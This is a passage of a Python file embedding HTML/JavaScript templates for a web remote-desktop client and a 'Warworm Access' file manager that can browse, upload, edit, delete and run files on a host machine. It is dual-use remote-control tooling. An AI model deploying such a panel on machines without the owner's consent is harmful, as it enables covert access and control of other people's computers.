            var btn = document.getElementById('loginBtn');
            var error = document.getElementById('errorMsg');
            var rateLimit = document.getElementById('rateLimitMsg');
            
            btn.disabled = true;
            btn.textContent = 'Connecting...';
            error.style.display = 'none';
            rateLimit.style.display = 'none';
            
            fetch('auth', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-CSRF-Token': CSRF_TOKEN
                },
                body: JSON.stringify({password: pwd})
            })
            .then(r => {
                if (r.status === 429) {
                    rateLimit.style.display = 'block';
                    throw new Error('Rate limited');
                }
                return r.json();
            })
            .then(data => {
                if (data.success) {
                    document.getElementById('loginScreen').style.display = 'none';
                    document.getElementById('mainInterface').style.display = 'block';
                    state.connected = true;
                    initStream();
                    startHealthCheck();
                    if (deviceInfo.isMobile) initMobile();
                    setupInputs();
                } else {
                    error.style.display = 'block';
                    btn.disabled = false;
                    btn.textContent = 'Connect';
                }
            })
            .catch(e => {
                if (e.message !== 'Rate limited') {
                    console.error('Login error:', e);
                    btn.disabled = false;
                    btn.textContent = 'Connect';
                }
            });
        }
        
        async function logout() {
            await fetch('logout', {method: 'POST', headers: {'X-CSRF-Token': CSRF_TOKEN}});
            window.location.reload();
        }
        
        function initStream() {
            fetch('info', {headers: {'X-CSRF-Token': CSRF_TOKEN}}).then(r => r.json()).then(data => {
                if (data.error) return;
                serverWidth = data.width;
                serverHeight = data.height;
                document.getElementById('resText').textContent = data.width + '×' + data.height;
                startStream();
            });
        }
        
        function startStream() {
            elements.img.src = 'stream?t=' + Date.now();
            var frameCount = 0;
            setInterval(() => {
                document.getElementById('fpsCounter').textContent = frameCount;
                frameCount = 0;
            }, 1000);
            elements.img.onload = () => frameCount++;
        }
        
        function startHealthCheck() {
            setInterval(() => {
                fetch('ping', {headers: {'X-CSRF-Token': CSRF_TOKEN}}).then(() => {
                    document.getElementById('statusDot').style.background = '#00ff88';
                    document.getElementById('statusText').textContent = 'Online';
                }).catch(() => {
                    document.getElementById('statusDot').style.background = '#ff3366';
                    document.getElementById('statusText').textContent = 'Offline';
                });
            }, 5000);
        }
        
        function initMobile() {
            var layer = elements.touchLayer;
            layer.addEventListener('touchstart', handleTouchStart, {passive: false});
            layer.addEventListener('touchmove', handleTouchMove, {passive: false});
            layer.addEventListener('touchend', handleTouchEnd, {passive: false});
            document.addEventListener('touchmove', e => { if (e.scale !== 1) e.preventDefault(); }, {passive: false});
        }
        
        function handleTouchStart(e) {
            e.preventDefault();
            for (var i = 0; i < e.changedTouches.length; i++) {
                var t = e.changedTouches[i];
                state.touches.set(t.identifier, {startX: t.clientX, startY: t.clientY, x: t.clientX, y: t.clientY});
            }
            if (state.touches.size === 2) {
                state.isPinching = true;
                var t = Array.from(state.touches.values());
                state.initialPinchDist = Math.hypot(t[0].x - t[1].x, t[0].y - t[1].y);
                state.initialZoom = state.zoom;
                showZoomPopup();
                return;
            }
            if (state.touches.size === 1 && state.control) {
                var touch = Array.from(state.touches.values())[0];
                state.touchStart = {x: touch.startX, y: touch.startY};
                state.isDragging = false;
                var pos = getPos(touch.x, touch.y);
                updateCursor(pos);
                var now = Date.now();
                if (now - (state.lastTap || 0) < 300) {
                    sendInput('mouse', {button: 'left', action: 'down'});
                    setTimeout(() => sendInput('mouse', {button: 'left', action: 'up'}), 50);
                    setTimeout(() => {
                        sendInput('mouse', {button: 'left', action: 'down'});
                        setTimeout(() => sendInput('mouse', {button: 'left', action: 'up'}), 50);
                    }, 100);
                }
                state.lastTap = now;
            }
        }
        
        function handleTouchMove(e) {
            e.preventDefault();
            for (var i = 0; i < e.changedTouches.length; i++) {
                var t = e.changedTouches[i];
                if (state.touches.has(t.identifier)) {
                    var touch = state.touches.get(t.identifier);
                    touch.x = t.clientX; touch.y = t.clientY;
                }
            }
            if (state.isPinching && state.touches.size === 2) {
                var t = Array.from(state.touches.values());
                var dist = Math.hypot(t[0].x - t[1].x, t[0].y - t[1].y);
                var scale = dist / state.initialPinchDist;
                updateZoom(Math.round(state.initialZoom * scale * 100), false);
                return;
            }
            if (state.touches.size === 1 && state.control && !state.isPinching) {
                var touch = Array.from(state.touches.values())[0];
                if (Math.abs(touch.x - state.touchStart.x) > 3 || Math.abs(touch.y - state.touchStart.y) > 3) {
                    state.isDragging = true;
                    var pos = getPos(touch.x, touch.y);
                    updateCursor(pos);
                    var now = Date.now();
                    if (now - state.lastMove > 30) {
                        sendInput('move', {x: pos.x, y: pos.y});
                        state.lastMove = now;
                    }
                }
            }
        }
        
        function handleTouchEnd(e) {
            e.preventDefault();
            var now = Date.now();
            for (var i = 0; i < e.changedTouches.length; i++) {
                var t = e.changedTouches[i];
                var touch = state.touches.get(t.identifier);
                if (touch && state.control && !state.isDragging && !state.isPinching) {
                    if (Math.abs(touch.x - touch.startX) < 10 && Math.abs(touch.y - touch.startY) < 10) {
                        sendInput('mouse', {button: 'left', action: 'down'});
                        setTimeout(() => sendInput('mouse', {button: 'left', action: 'up'}), 50);
                    }
                }
                state.touches.delete(t.identifier);
            }
            if (state.touches.size < 2) { state.isPinching = false; hideZoomPopup(); }
            if (state.touches.size === 0) state.isDragging = false;
        }
        
        function setupInputs() {
            var layer = elements.touchLayer;
            layer.addEventListener('mousedown', e => {
                if (!state.control) return;
                e.preventDefault();
                sendInput('mouse', {button: e.button === 2 ? 'right' : 'left', action: 'down'});
            });
            layer.addEventListener('mousemove', e => {
                if (!state.control) return;
                var pos = getPos(e.clientX, e.clientY);
                updateCursor(pos);
                var now = Date.now();
                if (now - state.lastMove > 30) {
                    sendInput('move', {x: pos.x, y: pos.y});
                    state.lastMove = now;
                }
            });
            layer.addEventListener('mouseup', e => {
                if (!state.control) return;
                sendInput('mouse', {button: e.button === 2 ? 'right' : 'left', action: 'up'});
            });
            layer.addEventListener('wheel', e => {
                e.preventDefault();
                if (e.ctrlKey) updateZoom(Math.round(state.zoom * (e.deltaY > 0 ? 0.9 : 1.1) * 100));
                else sendInput('scroll', {delta: e.deltaY > 0 ? -3 : 3});
            }, {passive: false});
            layer.addEventListener('contextmenu', e => e.preventDefault());
            document.addEventListener('keydown', handleKey);
            document.addEventListener('keyup', handleKey);
        }
        
        function getPos(clientX, clientY) {
            var rect = elements.img.getBoundingClientRect();
            var scaleX = serverWidth / rect.width;
            var scaleY = serverHeight / rect.height;
            var x = (clientX - rect.left) * scaleX;
            var y = (clientY - rect.top) * scaleY;
            return {
                x: Math.max(0, Math.min(serverWidth, Math.round(x))),
                y: Math.max(0, Math.min(serverHeight, Math.round(y))),
                rawX: clientX - rect.left, rawY: clientY - rect.top
            };
        }
        
        function updateCursor(pos) {
            elements.cursor.style.left = pos.rawX + 'px';
            elements.cursor.style.top = pos.rawY + 'px';
        }
        
        function sendInput(type, data) {
            if (!state.connected) return;
            fetch('input', {
                method: 'POST', 
                headers: {
                    'Content-Type': 'application/json',
                    'X-CSRF-Token': CSRF_TOKEN
                }, 
                body: JSON.stringify({type, data})
            }).catch(() => {});
        }
        
        function handleKey(e) {
            if (!state.control || e.target.tagName === 'INPUT') return;
            var special = ['Control', 'Alt', 'Shift', 'Meta', 'Enter', ' ', 'ArrowUp', 'ArrowDown', 'ArrowLeft', 'ArrowRight'];
            if (special.includes(e.key) || e.key.startsWith('F')) e.preventDefault();
            var map = {'Control': 'ctrl', 'Alt': 'alt', 'Shift': 'shift', 'Meta': 'win', 'Enter': 'return', ' ': 'space',
                'ArrowUp': 'up', 'ArrowDown': 'down', 'ArrowLeft': 'left', 'ArrowRight': 'right'};
            var key = map[e.key] || (e.key.length === 1 ? e.key.toLowerCase() : e.key);
            sendInput('key', {key: key, action: e.type === 'keydown' ? 'down' : 'up'});
        }
        
        function toggleControl() {
            state.control = !state.control;
            document.getElementById('btnCtrl').classList.toggle('active', state.control);
            document.getElementById('quickCtrl').classList.toggle('active', state.control);
            showToast(state.control ? 'Control ON' : 'View Only');
        }
        
        function updateFPS(val) {
            document.getElementById('fpsDisplay').textContent = val;
            fetch('set_fps', {
                method: 'POST', 
                headers: {
                    'Content-Type': 'application/json',
                    'X-CSRF-Token': CSRF_TOKEN
                }, 
                body: JSON.stringify({fps: parseInt(val)})
            });
        }
        
        function updateQuality(val) {
            document.getElementById('qualityDisplay').textContent = val + '%';
            fetch('set_quality', {
                method: 'POST', 
                headers: {
                    'Content-Type': 'application/json',
                    'X-CSRF-Token': CSRF_TOKEN
                }, 
                body: JSON.stringify({quality: parseInt(val)})
            });
        }
        
        function updateZoom(val, show) {
            state.zoom = Math.max(0.5, Math.min(3, val / 100));
            elements.wrapper.style.transform = 'scale(' + state.zoom + ')';
            document.getElementById('zoomDisplay').textContent = Math.round(state.zoom * 100) + '%';
            document.getElementById('zoomSlider').value = Math.round(state.zoom * 100);
            if (show !== false) {
                elements.zoomPopup.textContent = Math.round(state.zoom * 100) + '%';
                elements.zoomPopup.classList.add('show');
                setTimeout(() => elements.zoomPopup.classList.remove('show'), 600);
            }
        }
        
        function fitScreen() {
            var vw = window.innerWidth * 0.98, vh = window.innerHeight * 0.98;
            var zoom = Math.min(vw / serverWidth, vh / serverHeight, 1);
            updateZoom(Math.round(zoom * 100));
        }
        
        function toggleFullscreen() {
            if (!document.fullscreenElement) document.documentElement.requestFullscreen().catch(() => {});
            else document.exitFullscreen();
        }
        
        function toggleToolbar() {
            document.getElementById('toolbar').classList.toggle('hidden');
        }
        
        function showZoomPopup() {
            elements.zoomPopup.textContent = Math.round(state.zoom * 100) + '%';
            elements.zoomPopup.classList.add('show');
        }
        
        function hideZoomPopup() {
            elements.zoomPopup.classList.remove('show');
        }
        
        function showToast(msg) {
            elements.toast.textContent = msg;
            elements.toast.classList.add('show');
            setTimeout(() => elements.toast.classList.remove('show'), 2000);
        }
        
        document.getElementById('passwordInput').addEventListener('keypress', e => {
            if (e.key === 'Enter') doLogin();
        });
    </script>
</body>
</html>'''

# ============================================================================
# FILE MANAGER HTML - WITH AUTH PROTECTION
# ============================================================================
FM_HTML_TEMPLATE = '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="referrer" content="strict-origin-when-cross-origin">
    <title>File Manager | Warworm Access</title>
    <style>
        :root {
            --glass-bg: rgba(20, 20, 30, 0.7);
            --glass-border: rgba(255, 255, 255, 0.1);
            --glass-hover: rgba(255, 255, 255, 0.05);
            --accent: #00d4ff;
            --accent-glow: rgba(0, 212, 255, 0.3);
            --danger: #ff4757;
            --success: #2ed573;
            --warning: #ffa502;
            --text: #e0e0e0;
            --text-dim: #888;
            --bg: #0a0a0f;
        }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', system-ui, sans-serif;
            background: radial-gradient(ellipse at top, #1a1a2e 0%, transparent 50%),
                        radial-gradient(ellipse at bottom, #16213e 0%, transparent 50%),
                        var(--bg);
            color: var(--text);
            height: 100vh;
            overflow: hidden;
            font-size: 13px;
        }
        
        /* Login Overlay */
        #loginOverlay {
            position: fixed;
            inset: 0;
            background: rgba(10, 10, 15, 0.95);
            backdrop-filter: blur(20px);
            z-index: 10000;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .login-box {
            background: rgba(20, 20, 30, 0.9);
            border: 1px solid var(--glass-border);
            border-radius: 24px;
            padding: 3rem;
            width: 90%;
            max-width: 420px;
            text-align: center;
            box-shadow: 0 25px 50px rgba(0,0,0,0.5);
        }
        .login-box h1 {
            font-size: 1.5rem;
            margin-bottom: 0.5rem;
            background: linear-gradient(135deg, #00f0ff, #0066ff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        .login-subtitle { color: var(--text-dim); margin-bottom: 2rem; }
        .service-badge {
            display: inline-block;
            padding: 0.5rem 1rem;
            background: rgba(0, 212, 255, 0.1);
            border: 1px solid var(--accent);
            color: var(--accent);
            border-radius: 20px;
            font-size: 0.85rem;
            margin-bottom: 1.5rem;
        }
        .login-input {
            width: 100%;
            padding: 1rem;
            background: rgba(0,0,0,0.3);
            border: 1px solid var(--glass-border);
            border-radius: 12px;
            color: #fff;
            font-size: 1rem;
            margin-bottom: 1rem;
        }
        .login-input:focus {
            outline: none;
            border-color: var(--accent);
            box-shadow: 0 0 0 3px var(--accent-glow);
        }
        .login-btn {
            width: 100%;
            padding: 1rem;
            background: linear-gradient(135deg, var(--accent), #0066ff);
            border: none;
            border-radius: 12px;
            color: #000;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s;
        }
        .login-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px var(--accent-glow);
        }
        .login-error {
            color: var(--danger);
            margin-top: 1rem;
            padding: 0.75rem;
            background: rgba(255, 71, 87, 0.1);
            border-radius: 8px;
            display: none;
        }
        
        /* Main UI */
        .nav-bar { 
            position: fixed; 
            top: 0; 
            left: 0; 
            right: 0; 
            height: 50px; 
            background: rgba(30,30,40,0.95); 
            border-bottom: 1px solid var(--glass-border); 
            display: flex; 
            align-items: center; 
            justify-content: space-between; 
            padding: 0 20px; 
            z-index: 1001; 
        }
        .nav-title { color: var(--accent); font-weight: 700; font-size: 18px; }
        .nav-links { display: flex; gap: 15px; }
        .nav-links a { 
            color: #fff; 
            text-decoration: none; 
            padding: 8px 16px; 
            background: rgba(255,255,255,0.1); 
            border-radius: 8px; 
            font-size: 14px; 
            transition: all 0.3s; 
        }
        .nav-links a:hover { 
            background: rgba(0,212,255,0.2); 
            color: var(--accent); 
        }
        .logout-btn { 
            background: rgba(255, 71, 87, 0.2) !important; 
            color: #ff4757 !important; 
        }
        .bg-mesh {
            position: fixed;
            top: 0; left: 0; right: 0; bottom: 0;
            background: radial-gradient(circle at 20% 50%, rgba(0, 212, 255, 0.03) 0%, transparent 50%),
                        radial-gradient(circle at 80% 80%, rgba(138, 43, 226, 0.03) 0%, transparent 50%);
            pointer-events: none;
            z-index: 0;
        }
        .header {
            position: relative;
            z-index: 10;
            height: 60px;
            background: var(--glass-bg);
            backdrop-filter: blur(20px);
            border-bottom: 1px solid var(--glass-border);
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 0 24px;
            margin-top: 50px;
        }
        .brand {
            display: flex;
            align-items: center;
            gap: 12px;
            font-size: 18px;
            font-weight: 600;
        }
        .brand-icon {
            width: 48px;
            height: 48px;
            border-radius: var(--radius);
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .toolbar-container {
            position: relative;
            z-index: 10;
            padding: 16px 24px;
            display: flex;
            gap: 12px;
            align-items: center;
        }
        .toolbar-group {
            display: flex;
            gap: 8px;
            padding: 6px;
            background: var(--glass-bg);
            backdrop-filter: blur(20px);
            border: 1px solid var(--glass-border);
            border-radius: 12px;
        }
        .btn {
            height: 36px;
            padding: 0 16px;
            border: none;
            background: transparent;
            color: var(--text);
            border-radius: 8px;
            cursor: pointer;
            font-size: 13px;
            display: flex;
            align-items: center;
            gap: 8px;
            transition: all 0.2s;
        }
        .btn:hover { background: var(--glass-hover); transform: translateY(-1px); }
        .btn.primary { background: var(--accent); color: #000; font-weight: 600; }
        .btn.danger { color: var(--danger); }
        .btn:disabled { opacity: 0.4; cursor: not-allowed; }
        .btn-icon { width: 36px; padding: 0; justify-content: center; }
        .path-bar {
            position: relative;
            z-index: 10;
            margin: 0 24px 16px;
            padding: 12px 16px;
            background: var(--glass-bg);
            backdrop-filter: blur(20px);
            border: 1px solid var(--glass-border);
            border-radius: 12px;
            display: flex;
            align-items: center;
            gap: 8px;
            overflow-x: auto;
            font-family: monospace;
        }
        .path-bar::-webkit-scrollbar { display: none; }
        .workspace {
            position: relative;
            z-index: 10;
            display: flex;
            height: calc(100vh - 240px);
            margin: 0 24px;
            gap: 16px;
        }
        .sidebar {
            width: 220px;
            background: var(--glass-bg);
            backdrop-filter: blur(20px);
            border: 1px solid var(--glass-border);
            border-radius: 16px;
            padding: 16px;
            overflow-y: auto;
        }
        .sidebar-title {
            font-size: 11px;
            text-transform: uppercase;
            letter-spacing: 1px;
            color: var(--text-dim);
            margin-bottom: 12px;
            padding-left: 8px;
        }
        .nav-item {
            padding: 10px 12px;
            border-radius: 8px;
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 10px;
            color: var(--text-dim);
            margin-bottom: 4px;
            transition: all 0.2s;
            border: 1px solid transparent;
        }
        .nav-item:hover { background: var(--glass-hover); color: var(--text); }
        .nav-item.active { background: rgba(0, 212, 255, 0.1); color: var(--accent); border-color: var(--accent-glow); }
        .file-browser {
            flex: 1;
            background: var(--glass-bg);
            backdrop-filter: blur(20px);
            border: 1px solid var(--glass-border);
            border-radius: 16px;
            display: flex;
            flex-direction: column;
            overflow: hidden;
        }
        .file-header {
            display: grid;
            grid-template-columns: 40px 2fr 120px 160px 100px;
            padding: 12px 20px;
            background: rgba(0,0,0,0.2);
            border-bottom: 1px solid var(--glass-border);
            font-size: 11px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            color: var(--text-dim);
            font-weight: 600;
        }
        .file-list { flex: 1; overflow-y: auto; padding: 8px; }
        .file-item {
            display: grid;
            grid-template-columns: 40px 2fr 120px 160px 100px;
            align-items: center;
            padding: 12px 16px;
            margin: 2px 4px;
            border-radius: 10px;
            cursor: pointer;
            transition: all 0.15s;
            border: 1px solid transparent;
        }
        .file-item:hover { background: var(--glass-hover); border-color: var(--glass-border); transform: translateX(4px); }
        .file-item.selected { background: rgba(0, 212, 255, 0.08); border-color: var(--accent-glow); }
        .file-checkbox { width: 18px; height: 18px; cursor: pointer; accent-color: var(--accent); }
        .file-info { display: flex; align-items: center; gap: 12px; overflow: hidden; }
        .file-icon {
            width: 36px;
            height: 36px;
            background: rgba(255,255,255,0.05);
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 18px;
            flex-shrink: 0;
        }
        .file-name { font-weight: 500; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
        .file-meta { color: var(--text-dim); font-size: 12px; }
        .empty-state {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100%;
            color: var(--text-dim);
            gap: 16px;
            opacity: 0.6;
        }
        .progress-overlay {
            position: fixed;
            top: 0; left: 0; right: 0; bottom: 0;
            background: rgba(0,0,0,0.85);
            backdrop-filter: blur(12px);
            display: none;
            align-items: center;
            justify-content: center;
            z-index: 3000;
            padding: 20px;
        }
        .progress-modal {
            background: var(--glass-bg);
            border: 1px solid var(--glass-border);
            border-radius: 20px;
            padding: 32px;
            width: 100%;
            max-width: 420px;
            text-align: center;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
        }
        .context-menu {
            position: fixed;
            background: rgba(30, 30, 40, 0.95);
            backdrop-filter: blur(20px);
            border: 1px solid var(--glass-border);
            border-radius: 12px;
            padding: 8px;
            min-width: 200px;
            z-index: 1000;
            display: none;
            box-shadow: 0 20px 50px rgba(0,0,0,0.5);
        }
        .context-item {
            padding: 10px 14px;
            border-radius: 8px;
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 10px;
            color: var(--text);
        }
        .context-item:hover { background: var(--glass-hover); }
        .context-item.danger { color: var(--danger); }
        .context-divider { height: 1px; background: var(--glass-border); margin: 8px 0; }
        
        /* Modal Styles */
        .modal-overlay {
            position: fixed;
            top: 0; left: 0; right: 0; bottom: 0;
            background: rgba(0,0,0,0.8);
            backdrop-filter: blur(10px);
            display: none;
            align-items: center;
            justify-content: center;
            z-index: 2000;
            padding: 20px;
        }
        .modal-overlay.active { display: flex; }
        .modal {
            background: linear-gradient(135deg, rgba(30,30,40,0.95), rgba(20,20,30,0.95));
            border: 1px solid var(--glass-border);
            border-radius: 20px;
            width: 100%;
            max-width: 900px;
            height: 80vh;
            display: flex;
            flex-direction: column;
            overflow: hidden;
        }
        .modal-header { 
            padding: 20px 24px; 
            border-bottom: 1px solid var(--glass-border);
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .modal-title { font-size: 18px; font-weight: 600; }
        .modal-body { 
            flex: 1; 
            padding: 20px; 
            overflow: hidden;
            display: flex;
            flex-direction: column;
        }
        .editor-toolbar {
            display: flex;
            gap: 10px;
            margin-bottom: 10px;
            padding-bottom: 10px;
            border-bottom: 1px solid var(--glass-border);
        }
        .editor-textarea {
            flex: 1;
            background: rgba(0,0,0,0.3);
            border: 1px solid var(--glass-border);
            border-radius: 8px;
            padding: 16px;
            color: var(--text);
            font-family: 'Consolas', 'Monaco', monospace;
            font-size: 14px;
            line-height: 1.5;
            resize: none;
            outline: none;
        }
        .editor-textarea:focus { border-color: var(--accent); }
        .modal-footer { 
            padding: 20px 24px; 
            border-top: 1px solid var(--glass-border);
            display: flex; 
            justify-content: flex-end; 
            gap: 10px; 
        }
        
        /* Preview Drawer */
        .preview-drawer {
            position: fixed;
            right: -500px;
            top: 0;
            width: 500px;
            height: 100%;
            background: var(--glass-bg);
            backdrop-filter: blur(30px);
            border-left: 1px solid var(--glass-border);
            z-index: 100;
            transition: right 0.4s;
            display: flex;
            flex-direction: column;
        }
        .preview-drawer.active { right: 0; }
        .preview-header {
            padding: 24px;
            border-bottom: 1px solid var(--glass-border);
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .preview-title { font-size: 16px; font-weight: 600; }
        .preview-content {
            flex: 1;
            overflow: auto;
            padding: 24px;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-direction: column;
        }
        .preview-image {
            max-width: 100%;
            max-height: 60vh;
            border-radius: 8px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
        }
        .preview-text {
            width: 100%;
            background: rgba(0,0,0,0.3);
            border: 1px solid var(--glass-border);
            border-radius: 8px;
            padding: 20px;
            font-family: monospace;
            font-size: 13px;
            line-height: 1.5;
            white-space: pre-wrap;
            word-break: break-word;
            max-height: 60vh;
            overflow: auto;
        }
        .status-bar {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            height: 40px;
            background: rgba(10, 10, 15, 0.9);
            backdrop-filter: blur(20px);
            border-top: 1px solid var(--glass-border);
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 0 24px;
            font-size: 12px;
            color: var(--text-dim);
            z-index: 100;
        }
        .selection-badge {
            padding: 4px 12px;
            background: var(--accent);
            color: #000;
            border-radius: 12px;
            font-weight: 600;
            font-size: 11px;
            opacity: 0;
            transition: opacity 0.3s;
        }
        .selection-badge.active { opacity: 1; }
        .hidden { display: none !important; }
        ::-webkit-scrollbar { width: 8px; height: 8px; }
        ::-webkit-scrollbar-track { background: transparent; }
        ::-webkit-scrollbar-thumb { background: var(--glass-border); border-radius: 4px; }
        
        /* Upload Zone */
        .upload-zone {
            border: 2px dashed var(--glass-border);
            border-radius: 12px;
            padding: 40px;
            text-align: center;
            color: var(--text-dim);
            transition: all 0.3s;
            cursor: pointer;
        }
        .upload-zone:hover, .upload-zone.dragover {
            border-color: var(--accent);
            background: rgba(0, 212, 255, 0.05);
            color: var(--accent);
        }
    </style>
</head>
<body>
    <!-- Login Overlay -->
    <div id="loginOverlay">
        <div class="login-box">
            <div style="font-size: 3rem; margin-bottom: 1rem;">📁</div>
            <h1>File Manager</h1>
            <div class="login-subtitle">Secure Access Required</div>
            <div class="service-badge">Protection</div>
            <input type="password" id="loginPassword" class="login-input" placeholder="Enter access password..." autocomplete="off">
            <button class="login-btn" onclick="doLogin()">Access File Manager</button>
            <div class="login-error" id="loginError">Invalid password</div>
        </div>
    </div>

    <!-- Main UI -->
    <div class="nav-bar">
        <div class="nav-title">📁 File Manager</div>
        <div class="nav-links">
            <a href="../rd/">🖥️ Remote Desktop</a>
            <a href="#" onclick="logout()" class="logout-btn">🚪 Logout</a>
        </div>
    </div>
    <div class="bg-mesh"></div>
    <header class="header">
        <div class="brand">
            <div class="brand-icon">📂</div>
            <span>FILE MANAGER</span>
        </div>
        <div style="display: flex; gap: 8px;">
            <div class="connection-badge active" id="conn-status">
                <div class="pulse-dot"></div>
                <span>Secure</span>
            </div>
        </div>
    </header>
    <div class="toolbar-container">
        <div class="toolbar-group">
            <button class="btn btn-icon" onclick="goBack()">←</button>
            <button class="btn btn-icon" onclick="refresh()">↻</button>
            <button class="btn btn-icon" onclick="goUp()">↑</button>
        </div>
        <div class="toolbar-group">
            <button class="btn primary" onclick="triggerUpload()">
                <span>↑</span>
                <span>Upload</span>
            </button>
            <button class="btn" onclick="newFolder()">
                <span>+</span>
                <span>New Folder</span>
            </button>
        </div>
        <div class="toolbar-group">
            <button class="btn" id="btn-download" onclick="downloadSelected()" disabled>
                <span>↓</span>
                <span>Download</span>
            </button>
            <button class="btn" id="btn-edit" onclick="editSelected()" disabled>
                <span>✏️</span>
                <span>Edit</span>
            </button>
            <button class="btn" id="btn-exec" onclick="executeSelected()" disabled style="color: var(--warning); border-color: rgba(255, 165, 2, 0.3);">
                <span>▶️</span>
                <span>Run</span>
            </button>
            <button class="btn danger" id="btn-delete" onclick="deleteSelected()" disabled>Delete</button>
        </div>
    </div>
    <div class="path-bar" id="path-bar">
        <div class="path-segment current" onclick="loadDirectory(CONFIG.root)">📁 Root</div>
    </div>
    <div class="workspace">
        <aside class="sidebar">
            <div class="sidebar-title">Locations</div>
            <div class="nav-item active" onclick="loadDirectory(CONFIG.home)"><span>🏠</span> Home</div>
            <div class="nav-item" onclick="loadDirectory(CONFIG.desktop)"><span>🖥️</span> Desktop</div>
            <div class="nav-item" onclick="loadDirectory(CONFIG.documents)"><span>📄</span> Documents</div>
            <div class="nav-item" onclick="loadDirectory(CONFIG.downloads)"><span>📥</span> Downloads</div>
        </aside>
        <main class="file-browser">
            <div class="file-header">
                <div><input type="checkbox" id="select-all" onclick="toggleSelectAll()"></div>
                <div>Name</div>
                <div>Size</div>
                <div>Modified</div>
                <div>Type</div>
            </div>
            <div class="file-list" id="file-list">
                <div class="empty-state">
                    <div style="font-size: 48px">⟳</div>
                    <div>Loading...</div>
                </div>
            </div>
        </main>
    </div>
    
    <!-- Hidden File Input -->
    <input type="file" id="file-input" multiple class="hidden" onchange="handleUpload(this.files)">
    
    <!-- Progress Overlay -->
    <div class="progress-overlay" id="progress-overlay">
        <div class="progress-modal">
            <div style="font-size: 20px; font-weight: 600; margin-bottom: 12px;">Processing...</div>
            <div style="color: var(--text-dim); margin-bottom: 24px;" id="progress-file">filename.ext</div>
            <div style="width: 100%; height: 10px; background: rgba(255,255,255,0.1); border-radius: 5px; overflow: hidden; margin-bottom: 16px;">
                <div style="height: 100%; background: linear-gradient(90deg, var(--accent), #8a2be2); border-radius: 5px; transition: width 0.3s; width: 0%" id="progress-bar"></div>
            </div>
            <div style="font-size: 28px; font-weight: 700; color: var(--accent);" id="progress-text">0%</div>
            <button style="margin-top: 20px; padding: 12px 32px; background: rgba(255, 71, 87, 0.2); color: var(--danger); border: 1px solid var(--danger); border-radius: 10px; cursor: pointer;" onclick="cancelDownload()">Cancel</button>
        </div>
    </div>
    
    <!-- Context Menu -->
    <div class="context-menu" id="context-menu">
        <div class="context-item" onclick="contextAction('open')"><span>📂</span> Open</div>
        <div class="context-item" onclick="contextAction('preview')"><span>👁️</span> Preview</div>
        <div class="context-item" onclick="contextAction('download')"><span>⬇️</span> Download</div>
        <div class="context-item" onclick="contextAction('edit')"><span>✏️</span> Edit</div>
        <div class="context-divider"></div>
        <div class="context-item danger" onclick="contextAction('delete')"><span>🗑️</span> Delete</div>
    </div>
    
    <!-- Text Editor Modal -->
    <div class="modal-overlay" id="editor-modal">
        <div class="modal">
            <div class="modal-header">
                <div class="modal-title" id="editor-title">Edit File</div>
                <button class="btn btn-icon" onclick="closeEditor()">✕</button>
            </div>
            <div class="modal-body">
                <div class="editor-toolbar">
                    <span id="editor-info" style="color: var(--text-dim); font-size: 12px;">UTF-8</span>
                    <span style="flex:1"></span>
                    <button class="btn" onclick="formatContent()">Format</button>
                </div>
                <textarea class="editor-textarea" id="editor-content" spellcheck="false"></textarea>
            </div>
            <div class="modal-footer">
                <button class="btn" onclick="closeEditor()">Cancel</button>
                <button class="btn primary" onclick="saveFile()" id="save-btn">💾 Save Changes</button>
            </div>
        </div>
    </div>

    <button class="btn" id="btn-exec" onclick="executeSelected()" disabled style="color: var(--warning)">
        <span>▶️</span>
        <span>Run / Open</span>
    </button>
    
    <!-- Preview Drawer -->
    <div class="preview-drawer" id="preview">
        <div class="preview-header">
            <div class="preview-title" id="preview-title">Preview</div>
            <button class="btn btn-icon" onclick="closePreview()">✕</button>
        </div>
        <div class="preview-content" id="preview-content">
            <div class="empty-state">
                <div style="font-size: 48px">🖼️</div>
                <div>Select a file to preview</div>
            </div>
        </div>
    </div>
    
    <!-- Status Bar -->
    <footer class="status-bar">
        <div style="display: flex; align-items: center; gap: 16px;">
            <span id="status-text">Ready</span>
            <span class="selection-badge" id="selection-badge">0 selected</span>
        </div>
        <span id="item-count">0 items</span>
    </footer>

    <script>
        const CONFIG = {
            root: {{ root_path | safe }},
            home: {{ home_path | safe }},
            desktop: {{ desktop_path | safe }},
            documents: {{ documents_path | safe }},
            downloads: {{ downloads_path | safe }}
        };
        
        const CSRF_TOKEN = '{{ csrf_token }}';
        
        let currentPath = CONFIG.home || '/';
        let selectedFiles = new Set();
        let contextTarget = null;
        let currentFiles = [];
        let currentDownloadController = null;
        let isAuthenticated = false;
        let currentEditFile = null;
        
        // Initialize
        window.addEventListener('DOMContentLoaded', async () => {
            await checkAuth();
            setupDragDrop();
        });
        
        function setupDragDrop() {
            const fileList = document.getElementById('file-list');
            
            ['dragenter', 'dragover', 'dragleave', 'drop'].forEach(eventName => {
                fileList.addEventListener(eventName, preventDefaults, false);
                document.body.addEventListener(eventName, preventDefaults, false);
            });
            
            function preventDefaults(e) {
                e.preventDefault();
                e.stopPropagation();
            }
            
            ['dragenter', 'dragover'].forEach(eventName => {
